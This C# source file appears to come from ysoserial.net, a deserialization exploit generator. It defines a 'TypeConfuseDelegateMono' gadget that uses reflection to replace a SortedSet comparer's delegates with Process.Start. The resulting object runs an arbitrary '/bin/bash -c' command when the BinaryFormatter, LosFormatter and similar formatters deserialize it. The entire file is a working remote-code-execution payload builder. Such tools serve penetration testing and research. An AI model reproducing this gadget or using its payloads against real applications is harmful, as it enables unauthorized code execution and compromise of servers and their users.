﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;

namespace ysoserial.Generators
{
    class TypeConfuseDelegateMonoGenerator : GenericGenerator
    {
        public override string Name()
        {
            return "TypeConfuseDelegateMono";
        }

        public override string Description()
        {
            return "TypeConfuseDelegate gadget by James Forshaw - Tweaked to work with Mono";
        }

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "BinaryFormatter", "ObjectStateFormatter", "NetDataContractSerializer", "LosFormatter" };
        }

        public override object Generate(string cmd, string formatter, Boolean test)
        {
            return Serialize(TypeConfuseDelegateGadget(cmd), formatter, test);
        }

        /* this can be used easily by the plugins as well */
        public object TypeConfuseDelegateGadget(string cmd)
        {
            Delegate da = new Comparison<string>(String.Compare);
            Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);
            IComparer<string> comp = Comparer<string>.Create(d);
            SortedSet<string> set = new SortedSet<string>(comp);
            set.Add("/bin/bash");
            set.Add(" -c '" + cmd + "'");

            FieldInfo fi = typeof(MulticastDelegate).GetField("delegates", BindingFlags.NonPublic | BindingFlags.Instance);
            object[] invoke_list = d.GetInvocationList();
            // Modify the invocation list to add Process::Start(string, string)
            invoke_list[0] = new Func<string, string, Process>(Process.Start);
            invoke_list[1] = new Func<string, string, Process>(Process.Start);
            fi.SetValue(d, invoke_list);

            return set;
        }

    }
}
